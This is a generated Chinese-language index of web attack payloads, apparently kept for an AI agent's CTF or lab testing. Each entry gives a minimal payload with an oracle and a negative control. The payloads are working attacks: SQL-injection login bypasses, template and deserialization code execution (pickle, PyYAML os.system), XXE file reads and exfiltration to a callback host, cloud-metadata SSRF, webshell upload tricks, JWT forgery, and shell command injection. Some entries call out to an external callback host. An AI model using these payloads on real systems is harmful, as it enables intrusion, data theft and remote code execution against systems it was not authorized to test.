# Web Payload Index（小而准 / 可验证）

> 由 `bin/payload_index.py render` 从 `payload-index.jsonl` 生成，**不要手改本文件**。
> 这不是 PayloadsAllTheThings 的替代品；它只保留每条都能回答“怎么验”的最小条目。

## 使用协议（4 步，缺一不可）

1. **先抓基线**：正常请求的状态码、长度、跳转、关键字。没有基线就没有 oracle。
2. **只发最小载荷**：一次只改一个变量；先证明“模板被求值/文件被读到/命令被执行”，再谈利用链。
3. **看 oracle**：必须是可观测差异（49、`root:x:0:0`、`uid=`、+3s、回调、状态码）。
4. **做 control**：负对照必须不命中。control 也命中的差异，是页面噪声，不是漏洞。

失败后的顺序：换编码 → 换分隔符/注释 → 换位置（参数/头/Cookie/文件名）→ 换协议层。
同层连续 3 次否定就下沉，不要在同一层继续加字典。

条目后缀：**run** = 本轮真实题上验证过；**lab** = 本地 loopback lab 上 oracle+control 通过；**std** = 标准语法、未在本轮复测；**proc** = 需要生成 token/文件或多步 setup。

## 统计

| 类 | 条数 | 说明 |
|---|---:|---|
| `sqli` | 8 | SQL 注入：认证绕过、布尔/报错/时间/UNION、NoSQL |
| `ssti` | 8 | 模板注入：Jinja2/Twig/Freemarker/Velocity/ERB/Smarty/Thymeleaf |
| `xxe` | 8 | XML 外部实体：文件读取、UTF-16 绕 WAF、OOB、SVG/SOAP |
| `lfi` | 8 | 本地文件包含：遍历、strip/编码、filter、日志/data/phar |
| `deser` | 8 | 反序列化：PHP/Java/Python/Node/YAML/.NET 的检测与最小验证 |
| `ssrf` | 8 | SSRF：IP 变形、元数据、gopher、allowlist 绕过 |
| `upload` | 8 | 文件上传：后缀/内容类型/魔术字节/.htaccess/路径穿越 |
| `jwt` | 8 | JWT：none、弱密钥、算法混淆、jku/x5u、kid、claim |
| `cmdi` | 8 | 命令注入：分隔符、换行、子 shell、空格绕过、编码 |

## sqli

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `sqli-auth-01` | 注释截断登录 · **run** | 登录表单；用户名直接拼 SQL；失败固定文案或 302 | `admin' -- ` | 任意密码登录成功：302 到 dashboard，或页面出现后台菜单/用户名 | admin' -- 换成 nouser' -- 应失败；正常 admin + 错误密码应失败<br>→ 空格被过滤 → admin'/**/--；括号包裹 → admin')-- -；MSSQL → admin'--（无尾空格） |
| `sqli-auth-02` | 井号截断登录 · **run** | MySQL 登录；-- 后的空格被 WAF 去掉 | `admin'#` | 登录成功 / 302 dashboard | nouser'# 失败；正常错误密码失败<br>→ # 被过滤 → admin'-- -；admin'/* 截断 |
| `sqli-error-01` | 单引号报错指纹 · **run** | 单引号后 500 / SQL 错误 / 堆栈 | `'` | 500、SQL syntax、unclosed quotation、ORA-、SQLSTATE 等错误 | '' 或正常数字不报错；同一路由换双引号可能不报<br>→ 换双引号、')、反斜杠；若统一 500，改布尔/时间盲注 |
| `sqli-bool-01` | 布尔真假对照 · **lab** | id 参数；真假条件响应不同 | `' AND 1=1-- -` | 1=1 与正常页一致；1=2 时内容/长度/状态不同 | AND 1=1 应等于基线；AND 1=2 应不等于基线<br>→ AND '1'='1；AND 1 LIKE 1；空格过滤 → /**/ |
| `sqli-union-01` | UNION 列数探测 · **lab** | 页面回显查询结果；ORDER BY 可定列数 | `' UNION SELECT 1,2,3-- -` | 页面出现 1/2/3 中的一个或多个数字；列数不对会报错 | UNION SELECT 1,2 应报列数错；UNION SELECT 1,2,3,4 也报错<br>→ 先 ORDER BY n 定列数；用 NULL 代替数字避免类型错；回显位用 @@version |
| `sqli-time-01` | 时间盲注（3 秒） · std | 无回显；条件延迟可观测 | `' AND SLEEP(3)-- -` | 响应比基线慢 ≥3s；SLEEP(0) 不慢 | ' AND SLEEP(0)-- - 与基线同速；网络抖动要先测 3 次基线<br>→ SLEEP 被过滤 → BENCHMARK(3000000,MD5(1))；PG → ; SELECT pg_sleep(3)-- -；MSSQL → ; WAITFOR DELAY '0:0:3'-- - |
| `sqli-stacked-01` | 堆叠语句 · std | API 允许一次执行多条语句；无回显 | `'; SELECT pg_sleep(3)-- -` | 延迟 3s；或第二语句写入临时表后被读到 | '; SELECT 1-- - 不延迟<br>→ MySQL → '; SELECT SLEEP(3)-- -；MSSQL → '; WAITFOR DELAY '0:0:3'-- - |
| `sqli-nosql-01` | Mongo 登录绕过 · std | JSON 登录；username/password 直接进 Mongo 查询 | `{"username":{"$ne":null},"password":{"$ne":null}}` | 登录成功 / 返回用户对象 / 302 dashboard | {"username":"nope","password":"nope"} 失败<br>→ {"$regex":"^a"} 枚举；{"$gt":""}；$where 盲注 |

## ssti

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `ssti-jinja-01` | Jinja2 算术探针 · **run** | 输入被模板渲染；{{ 原样回显或求值 | `{{7*7}}` | 页面出现 49；原文 {{7*7}} 不再出现 | {{7*6}} → 42；{{7*7}} 作为纯文本应保持原样<br>→ {{7*'7'}} → 7777777 确认 Jinja2；{{config}} 看配置；RCE 前先只读 {{cycler.__init__.__globals__.os.popen('id').read()}} |
| `ssti-discriminator-01` | Jinja2 / Twig 判别 · **lab** | {{7*7}} 已返回 49，需要区分 Jinja2 / Twig | `{{7*'7'}}` | Jinja2 → 7777777；Twig → 49 | {{7*7}} 两者都返回 49，不能区分<br>→ Jinja2 → {{config}}/{{self}}；Twig → {{_self}}/{{_self.env}} |
| `ssti-freemarker-01` | FreeMarker 算术探针 · std | Java 模板；${...} 被求值 | `${7*7}` | 49 | ${7*6} → 42；${'7'*7} 报错<br>→ ${7?c}；<#assign x=7*7>${x}；RCE 前先读 ${.version} |
| `ssti-velocity-01` | Velocity #set 探针 · std | Java 模板；#set 可用 | `#set($x=7*7)$x` | 49 | #set($x=7*6)$x → 42<br>→ #set($x='') 探空；$class.inspect 读类 |
| `ssti-erb-01` | ERB 算术探针 · std | Ruby 模板；<%= %> 被求值 | `<%= 7*7 %>` | 49 | <%= 7*6 %> → 42<br>→ <%= 7*'7' %> → 7777777；<%= `id` %> 只在确认后 |
| `ssti-smarty-01` | Smarty math 探针 · std | PHP Smarty；{math} 可用 | `{math equation="7*7"}` | 49 | {math equation="7*6"} → 42<br>→ {$smarty.version}；{if 7==7}yes{/if} |
| `ssti-thymeleaf-01` | Thymeleaf 内联探针 · std | Java Spring；[[...]] 内联表达式 | `[[${7*7}]]` | 49 | [[${7*6}]] → 42<br>→ [[${T(java.lang.Runtime)}]] 只在确认后；先读 ${#request} |
| `ssti-mako-01` | Mako 算术探针 · std | Python Mako；${...} 被求值 | `${7*7}` | 49 | ${7*6} → 42；与 FreeMarker 用错误页区分<br>→ ${self.module}；<% %> 代码块 |

## xxe

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `xxe-file-01` | 经典文件读取 · **lab** | XML 输入；响应回显实体 | `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<x>&e;</x>` | 响应含 root:x:0:0 | 去掉 DOCTYPE/ENTITY 的同一 XML 只返回普通结果；&e; 未定义应报错<br>→ Windows → file:///c:/windows/win.ini；被过滤 → UTF-16；盲打 → OOB |
| `xxe-utf16-01` | UTF-16 绕字节 WAF · **run** | 原始 UTF-8 XML 被 WAF 按字节拦 | `<?xml version="1.0" encoding="UTF-16"?>\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/pas…` | 响应含 root:x:0:0；WAF 不再 403 | UTF-8 版本被 403；UTF-16 版本 200<br>→ UTF-16BE 带 BOM；或 encoding=UTF-16LE 只换编码声明 |
| `xxe-oob-01` | 参数实体 OOB 探测 · **lab** · proc | XML 无回显；允许外部 DTD | `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY % p SYSTEM "http://<CALLBACK>/"><!ENTITY % …` | callback 收到 DNS/HTTP 请求；x.dtd 被拉取 | 删掉 %d; 后无请求<br>→ 被 DNS 过滤 → 用 HTTP；无出网 → error-based |
| `xxe-exfil-01` | 外部 DTD 带文件内容 · std · proc | 有外部 DTD，想把文件内容带出来 | `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY % f SYSTEM "php://filter/convert.base64-enc…` | callback 收到 base64 文本；解码后是 passwd | 把 resource 改成不存在文件，callback 无内容或报错<br>→ Java 不能用 php filter → 用 file:// + 外部 DTD 的 %all;；或 FTP listener |
| `xxe-expect-01` | PHP expect wrapper · std | PHP 的 expect:// wrapper 可用 | `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e SYSTEM "expect://id">]>\n<x>&e;</x>` | 响应含 uid= | expect://echo 0 返回 0；expect 未装则报错<br>→ 没有 expect → 用 php://filter 读源码；或 data:// |
| `xxe-svg-01` | SVG 实体读取 · std · proc | 允许上传/渲染 SVG | `<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<svg xml…` | 渲染结果/缩略图/响应含 root:x:0:0 | 不带 DOCTYPE 的 SVG 正常渲染<br>→ 转 PNG 的渲染器可能不回显 → 用 error-based 或 OOB |
| `xxe-soap-01` | SOAP 实体读取 · std | SOAP 接口；XML body | `<?xml version="1.0"?>\n<!DOCTYPE s [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n<s:Envelop…` | SOAP 响应/错误里含 root:x:0:0 | 去掉 DOCTYPE 的 SOAP 请求正常返回<br>→ 被 SOAP 校验拦 → 把实体放在 header/body 的字符串字段 |
| `xxe-error-01` | 错误型实体探测 · std | XML 不回显；但错误页带解析器信息 | `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///nonexistent">]>\n<x>&e;</x>` | 错误信息含 file:///nonexistent、解析器版本或实体名 | 合法实体不报错；普通 XML 不报错<br>→ 把路径换成 /etc/passwd 看是否从错误变内容；或 OOB |

## lfi

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `lfi-traversal-01` | 基础目录遍历 · **run** | ?file= / ?page= 直接拼路径 | `../../../../etc/passwd` | root:x:0:0 | ../../../../etc/hostname 或正常页面；不存在的文件报错<br>→ Windows → ..\..\..\..\windows\win.ini；深度不够 → 加到 8 层 |
| `lfi-strip-01` | strip 一次绕过 · **run** | ../ 被 strip 一次 | `....//....//....//....//etc/passwd` | root:x:0:0 | ../../etc/passwd 被拦；....// 版本通过<br>→ ..././、..%2f、%2e%2e%2f |
| `lfi-url-01` | URL 编码遍历 · **lab** | ../ 原文被拦，但 URL 解码发生在其后 | `..%2f..%2f..%2f..%2fetc%2fpasswd` | root:x:0:0 | ..%252f（双编码）应失败，除非又 decode 一次<br>→ 双编码 %252e%252e%252f；%c0%ae 等 overlong |
| `lfi-double-01` | 双重编码遍历 · **lab** | 应用 decode 两次（WAF 一次 + 业务一次） | `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd` | root:x:0:0 | 单编码 ..%2f 被拦；双编码通过<br>→ 三层编码；或 %2e%2e/ 混用 |
| `lfi-filter-01` | php://filter 读源码 · **lab** | LFI 但不能直接读 PHP（会被执行） | `php://filter/convert.base64-encode/resource=index.php` | 返回大段 base64；解码后是 PHP 源码 | resource=index 可能 404；convert.base64-decode 乱码<br>→ convert.iconv.UTF8.CSISO2022KR 链做 RCE；zlib.deflate 读二进制 |
| `lfi-log-01` | 日志投毒 RCE · **run** · proc | LFI + 可写日志（access/error） | `<?php echo 49;?>` | 先投毒，再 include ../../../../var/log/nginx/access.log，响应出现 49 | 不投毒只 include 日志，49 不出现<br>→ 日志被截断 → 用 error.log；路径不确定 → /proc/self/fd/* |
| `lfi-data-01` | data:// 代码执行 · std | LFI + allow_url_include=On | `data://text/plain,<?php echo 49;?>` | 响应 49 | data://text/plain,49 返回 49 但无 PHP；allow_url_include=Off 报错<br>→ php://input + POST body；expect://id |
| `lfi-phar-01` | phar:// 元数据反序列化 · std · proc | 有上传 + LFI；PHP < 8 | `phar://uploads/a.jpg/x` | 触发 __destruct/__wakeup 的可见副作用（写文件/CALLBACK 请求） | phar:// 在 PHP 8 不再触发；换成普通 file:// 无副作用<br>→ 生成 phar 时把 metadata 设为目标对象；PHP 8 → 换其他链 |

## deser

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `deser-php-01` | PHP 对象解析探针 · **lab** | Cookie/参数形如 O:...；unserialize 可用 | `O:8:"stdClass":0:{}` | 不再报 unserialize(): Error；对象被接受（页面/会话变化） | O:8:"Nope":0:{} 报 class not found；随机字符串报错<br>→ 从源码找 __wakeup/__destruct；构造 O:4:"User":1:{s:4:"role";s:5:"admin";} |
| `deser-php-array-01` | PHP 数组注入 · std | 序列化数组直接进会话/权限字段 | `a:2:{s:4:"role";s:5:"admin";s:4:"name";s:1:"x";}` | 登录后出现 admin 菜单/接口返回 admin | role 改成 user 应回到普通用户<br>→ 属性名从源码/JS 找；role 可能是 is_admin/group |
| `deser-phar-01` | phar 元数据触发 · std · proc | 有上传 + 文件操作；PHP < 8 | `phar://uploads/a.jpg` | 触发 __destruct 的副作用（写 webshell/CALLBACK 请求） | PHP 8 不触发；普通 uploads/a.jpg 无副作用<br>→ phar 生成脚本；metadata 用目标类 |
| `deser-java-01` | Java 序列化入口探测 · std | Base64 以 rO0AB 开头；Java 反序列化 | `rO0ABQ==` | 响应出现 Java 反序列化错误（InvalidClassException/ClassNotFoundException/StreamCorruptedException） | 随机 base64 AAAA 不触发反序列化错误；普通 JSON 不报<br>→ 用 ysoserial URLDNS <CALLBACK> 生成完整 gadget，先验证 DNS 出网 |
| `deser-python-01` | pickle 最小执行 · **run** | Cookie/参数是 pickle（gASV... / cos\n） | `cos\nsystem\n(S'id'\ntR.` | 响应/回调出现 uid= | cos\nsystem\n(S'echo 0'\ntR. 输出 0；pickle.loads 禁用则报错<br>→ __reduce__ 返回 subprocess.check_output(['id'])；restricted → 手工 opcode 链 |
| `deser-node-01` | node-serialize 函数执行 · std | JSON 里有 _$$ND_FUNC$$_；node-serialize | `{"rce":"_$$ND_FUNC$$_function(){return 7*7}()"}` | 返回 49 / 响应里出现 49 | {"rce":"7*7"} 返回字符串 7*7<br>→ function(){return process.version}()；RCE 前先只读 |
| `deser-yaml-01` | PyYAML 不安全加载 · **lab** | YAML 输入；yaml.load 非 safe | `!!python/object/apply:os.system ["id"]` | 响应/回调出现 uid= | !!python/object/apply:os.system ["echo 0"] 输出 0；safe_load 报错<br>→ subprocess.check_output；!!python/object/new |
| `deser-dotnet-01` | .NET BinaryFormatter 探测 · std · proc | Base64 AAEAAAD 开头；ViewState/BinaryFormatter | `AAEAAAD/////` | 反序列化错误 / callback | 随机 base64 不触发<br>→ ysoserial.net；ViewState 需要 machineKey |

## ssrf

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `ssrf-decimal-01` | 十进制 IP · **run** | URL 参数可请求外部；127.0.0.1 被关键字拦 | `http://2130706433/` | 返回内网服务 banner/首页；与 http://127.0.0.1/ 相同 | http://2130706434/ 指向别的地址，响应不同或超时<br>→ 十六进制 0x7f000001；八进制 0177.0.0.1；短写 127.1 |
| `ssrf-hex-01` | 十六进制 IP · **lab** | 十进制被拦；解析器接受十六进制 | `http://0x7f000001/` | 内网响应与 127.0.0.1 相同 | http://0x7f000002/ 响应不同或超时<br>→ 0x7f.0.0.1；0x7f000001:80 |
| `ssrf-octal-01` | 八进制 IP · **lab** | 十进制/十六进制被拦；解析器接受八进制 | `http://0177.0.0.1/` | 内网响应与 127.0.0.1 相同 | http://0177.0.0.2/ 响应不同<br>→ 0177.1；0.0.0.0 |
| `ssrf-short-01` | 短写 127.1 · **lab** | 完整 IP 被拦；inet_aton 接受短写 | `http://127.1/` | 内网响应与 127.0.0.1 相同 | http://127.2/ 响应不同<br>→ 127.0.1；0；localhost |
| `ssrf-ipv6-01` | IPv6 回环 · **lab** | IPv4 回环被拦；服务监听 ::1 | `http://[::1]/` | 内网响应，与 http://127.0.0.1/ 相同 | http://[::2]/ 超时/不同<br>→ [::ffff:127.0.0.1]；[0:0:0:0:0:0:0:1] |
| `ssrf-metadata-01` | 云元数据 · **run** | SSRF 可达 169.254.169.254 | `http://169.254.169.254/latest/meta-data/` | 返回 iam/、hostname、instance-id 等目录 | http://169.254.169.254/latest/ 也可能 200；用具体路径区分<br>→ IMDSv2 先 PUT token；GCP 加 Metadata-Flavor: Google；Azure 加 Metadata: true |
| `ssrf-gopher-01` | gopher 打 Redis · std | SSRF 支持 gopher；内网有 Redis | `gopher://127.0.0.1:6379/_INFO` | Redis INFO 文本（redis_version） | gopher://127.0.0.1:6379/_PING 返回 PONG<br>→ gopher 被禁 → dict://；Redis 写文件只在授权靶场 |
| `ssrf-allowlist-01` | userinfo 绕 allowlist · **lab** | SSRF 只允许特定域名；解析器把 @ 前当 userinfo | `http://allowed.com@127.0.0.1/` | 请求打到 127.0.0.1，但 allowlist 看到 allowed.com | http://127.0.0.1/ 被 allowlist 拦；payload 通过<br>→ http://127.0.0.1#@allowed.com；http://allowed.com.127.0.0.1.nip.io |

## upload

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `upload-php-01` | Content-Type 绕过 · **lab** | 上传点只查 Content-Type | `shell.php` | GET /uploads/shell.php 返回 49 | 上传 shell.txt 访问返回源码/404，不执行<br>→ Content-Type 改成 image/jpeg；后缀改 .phtml |
| `upload-double-01` | 双后缀 .php.jpg · **lab** | 黑名单只查最后一个后缀 | `shell.php.jpg` | /uploads/shell.php.jpg 被 PHP 处理器执行（49） | /uploads/shell.jpg 只返回图片<br>→ .php5、.phtml、.phar；Apache 多后缀解析 |
| `upload-reverse-01` | 反序 .jpg.php · **lab** | 黑名单查第一个后缀 | `shell.jpg.php` | 执行 49 | shell.php.jpg 不执行（取决于配置）<br>→ .php.、.php%00.jpg（旧 PHP） |
| `upload-htaccess-01` | .htaccess 改处理器 · **run** · proc | 可上传任意文件，但只允许图片后缀 | `AddType application/x-httpd-php .jpg` | 再上传 shell.jpg（内容 <?php echo 49;?>），访问返回 49 | 不传 .htaccess 时 shell.jpg 不执行<br>→ AddHandler、SetHandler；Nginx 不适用 |
| `upload-phtml-01` | phtml 后缀 · **lab** | .php 被黑名单；其他 PHP 后缀未禁 | `shell.phtml` | 执行 49 | .php 被黑名单，.phtml 通过<br>→ .php5、.pht、.phar、.inc |
| `upload-magic-01` | 魔术字节前缀 · **lab** | 只检查文件头魔术字节 | `GIF89a<?php echo 49;?>` | 上传成功且访问执行 49 | 纯 <?php ...?> 被拒；GIF89a 前缀通过<br>→ \xff\xd8\xff JPEG 头；PNG 头 + tEXt |
| `upload-polyglot-01` | 图片 polyglot · **run** · proc | 图片必须能渲染，但还要 PHP 执行 | `<JPEG bytes> + <?php echo 49;?>` | 图片能打开，同时 URL 访问返回 49 | 只传 JPEG 不执行；只传 PHP 被拒<br>→ EXIF/tEXt 里放 payload；.php.jpg + .htaccess |
| `upload-traversal-01` | 文件名路径穿越 · **lab** | 上传文件名可控 | `../../shell.php` | 文件落到 web 根/可执行目录，访问返回 49 | shell.php 只落到 uploads；../ 被过滤<br>→ ..%2f；....//；绝对路径 |

## jwt

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `jwt-none-01` | alg:none · **lab** · proc | JWT；服务端信任 header 的 alg | `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<PAYLOAD>.` | 用无签名 token 访问 admin 成功 | 把 alg 改回 HS256、签名乱填，应 401<br>→ None/NONE/nOnE 变体；alg:null |
| `jwt-weak-01` | HS256 弱密钥 · **lab** · proc | HS256；密钥可能是弱口令 | `HS256 + secret（用 flask-unsign/hashcat 验证）` | 用 secret 重签后访问成功（200） | 用错误密钥重签应 401<br>→ flask-unsign --unsign；hashcat -m 16500；字典先 100 条 |
| `jwt-confusion-01` | RS256→HS256 混淆 · std · proc | RS256；服务端可能把公钥当 HMAC 密钥 | `RS256 -> HS256，HMAC key = 公钥 PEM` | HS256 签名被接受，访问 admin | 用随机 HMAC 密钥重签应 401<br>→ jku/x5u 指向自己的公钥；kid 注入 |
| `jwt-jku-01` | jku 指向攻击者 JWKS · **run** · proc | header 有 jku；服务端会拉取 JWKS | `{"jku":"http://<CALLBACK>/jwks.json","alg":"RS256"}` | 服务端拉取 callback 的 JWKS，并用攻击者公钥验签成功 | 不设 jku 时用原公钥；设 jku 但 JWKS 不匹配应 401<br>→ x5u 证书；jwk 内嵌公钥 |
| `jwt-x5u-01` | x5u 指向攻击者证书 · std · proc | header 有 x5u；服务端会拉取证书 | `{"x5u":"http://<CALLBACK>/cert.pem","alg":"RS256"}` | callback 收到证书请求；服务端用其公钥验签成功 | 不设 x5u 应 401<br>→ 自签证书 + 对应私钥签 token |
| `jwt-kid-path-01` | kid 路径穿越 · **lab** · proc | header 有 kid；可能拼路径读密钥 | `{"kid":"../../../../dev/null","alg":"HS256"} + 空密钥签名` | 空密钥 HMAC 被接受（200） | kid 用正常 id 时应 401/使用原密钥<br>→ kid 指向可预测文件；/proc/self/environ |
| `jwt-kid-sqli-01` | kid SQL 注入 · std · proc | kid 进了 SQL 查询 | `{"kid":"' UNION SELECT 'secret'-- -","alg":"HS256"}` | 用 secret 做 HMAC key 重签被接受 | kid 正常值应 401<br>→ kid 报错注入；kid 时间盲注 |
| `jwt-claim-01` | 单数 group claim · **run** · proc | JWT claim 里有 group/groups/role | `{"group":"admin"}（不是 groups）` | 换取 admin/ops 凭据成功 | {"groups":["admin"]} 不生效；{"group":"user"} 不生效<br>→ 从 JS/源码/错误信息找准确 claim 名；scope/roles |

## cmdi

| ID | 标题 | 信号 | 最小载荷 | Oracle | 控制 / 失败后 |
|---|---|---|---|---|---|
| `cmdi-semi-01` | 分号串联 · **lab** | 参数拼进 shell 命令；有回显 | `; id` | 响应含 uid= | ; echo 0 输出 0；正常参数不输出 uid<br>→ \| id、\|\| id、&& id、%0a id |
| `cmdi-pipe-01` | 管道串联 · **lab** | ; 被过滤；管道可用 | `\| id` | 响应含 uid= | \| echo 0 输出 0<br>→ \|\| id；\|& id；管道 + base64 |
| `cmdi-or-01` | 逻辑或 · **lab** | ; 与 \| 被过滤 | `\|\| id` | 响应含 uid= | \|\| echo 0 输出 0<br>→ && id；& id |
| `cmdi-and-01` | 逻辑与 · **lab** | 前一条命令成功时才执行 | `&& id` | 响应含 uid= | && echo 0 输出 0<br>→ & id；%0a id |
| `cmdi-newline-01` | 换行注入 · **lab** | 分号/管道被过滤；换行可用 | `%0a id` | 响应含 uid= | %0a echo 0 输出 0<br>→ %0d%0a；${IFS} |
| `cmdi-subshell-01` | 子 shell · **run** | 分隔符被过滤；反引号/$() 可用 | `` `id` `` | 响应含 uid= | `echo 0` 输出 0<br>→ $(id)；${IFS} |
| `cmdi-space-01` | IFS 绕空格 · **lab** | 空格被过滤；命令仍进 shell | `;${IFS}id` | 响应含 uid= | ;${IFS}echo${IFS}0 输出 0<br>→ $IFS；%09；< 重定向 |
| `cmdi-base64-01` | base64 编码执行 · **lab** | 关键字/空格/分隔符都被过滤 | `;echo aWQ=\|base64 -d\|sh` | 响应含 uid= | ;echo ZWNobyAw\|base64 -d\|sh 输出 0<br>→ xxd -r；printf '\x69\x64'\|sh |

## 详细字段

```bash
python ~/.pi/agent/bin/payload_index.py show <id>
python ~/.pi/agent/bin/payload_index.py curl <id> --target <URL>  # 只打印请求，不发送
python ~/.pi/agent/bin/payload_index.py search <关键词>
python ~/.pi/agent/bin/payload_index.py validate   # 结构 + 破坏性模式
python ~/.pi/agent/bin/payload_index.py selftest   # 编码/JSON/oracle_value 自检
```

每条详情都包含 `stack`（版本/框架假设）、`placement`（放哪）、`encoding`（怎么编）、
`verify`（怎么确认不是噪声）与 `ref`（本机对应笔记）。
